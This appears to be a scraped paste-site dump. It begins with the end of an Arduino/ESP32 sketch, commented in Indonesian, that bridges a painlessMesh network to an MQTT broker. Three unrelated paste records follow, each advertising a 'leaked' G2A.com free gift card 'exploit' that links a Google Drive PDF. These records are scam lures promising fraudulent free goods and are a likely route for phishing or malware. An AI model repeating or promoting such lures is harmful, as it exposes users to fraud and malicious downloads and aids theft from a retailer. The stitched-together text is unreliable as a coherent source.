  mesh.setHostname(HOSTNAME);
  mesh.setRoot(true);       										// Tetapkan node ini sebagai root
  mesh.setContainsRoot(true);

  mqttClient.setServer(mqttBroker, mqttPort);
  mqttClient.setCallback(mqttCallback);
}

void loop() {
  mesh.update();
  mqttClient.loop();

  // Periksa dan perbarui alamat IP
  if (myIP != getLocalIP()) {
    myIP = getLocalIP();
    Serial.println(""IP saya adalah "" + myIP.toString());

    if (mqttClient.connect(""painlessMeshClient"", mqttUser, mqttPassword)) {
      Serial.println(""Terhubung ke broker MQTT"");
      mqttClient.publish(""painlessMesh/from/gateway"", ""Ready!"");
      mqttClient.subscribe(""painlessMesh/to/#"");
    } else {
      Serial.println(""Gagal terhubung ke broker MQTT"");
    }
  }
}

// Callback untuk pesan yang diterima dari jaringan mesh
void receivedCallback(const uint32_t &from, const String &msg) {
  Serial.printf(""bridge: Diterima dari %u msg=%s\n"", from, msg.c_str());
  String topic = ""all_node3"";
  bool result = mqttClient.publish(topic.c_str(), msg.c_str());
  if(result) {
    Serial.println(""Pesan berhasil dikirim ke MQTT"");
  } else {
    Serial.println(""Gagal mengirim pesan ke MQTT"");
  }
}

// Callback untuk pesan yang diterima dari broker MQTT
void mqttCallback(char* topic, uint8_t* payload, unsigned int length) {
  Serial.print(""Pesan diterima dari MQTT, topik: "");
  Serial.println(topic);
  char* cleanPayload = (char*)malloc(length + 1);
  memcpy(cleanPayload, payload, length);
  cleanPayload[length] = '\0';
  String msg = String(cleanPayload);
  free(cleanPayload);

  Serial.print(""Payload: "");
  Serial.println(msg);

  String targetStr = String(topic).substring(16); // Ekstrak ID target dari topik

  if (targetStr == ""gateway"") {
    if (msg == ""getNodes"") {
      auto nodes = mesh.getNodeList(true);
      String str;
      for (auto &&id : nodes)
        str += String(id) + String("" "");
      mqttClient.publish(""painlessMesh/from/gateway"", str.c_str());
    }
  } else if (targetStr == ""broadcast"") {
    mesh.sendBroadcast(msg);
  } else {
    uint32_t target = strtoul(targetStr.c_str(), NULL, 10);
    if (mesh.isConnected(target)) {
      mesh.sendSingle(target, msg);
    } else {
      mqttClient.publish(""painlessMesh/from/gateway"", ""Client not connected!"");
    }
  }
}

// Fungsi untuk mendapatkan alamat IP lokal node
IPAddress getLocalIP() {
  return IPAddress(mesh.getStationIP());
}
"
HtvcNa8D,üöÄG2A.com Free Gift Card MAY 2024 FIXüí∞,pestinha,Python,Saturday 25th of May 2024 03:41:21 AM CDT,"Leaked G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_2684136.pdf

Working as of:

25 May 2024"
qET4DrgM,üí∏G2A.com Free Gift Card MAY 2024 FIXüöÄ,pestinha,Python,Saturday 25th of May 2024 03:33:21 AM CDT,"Leaked G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_0927124.pdf

Working as of:

25 May 2024"
XJt6ruqS,üí∏G2A.com Free Gift Card MAY 2024 FIXüéâ,pestinha,GetText,Saturday 25th of May 2024 03:32:17 AM CDT,"Leaked G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_8381772.pdf

Working as of:

25 May 2024"
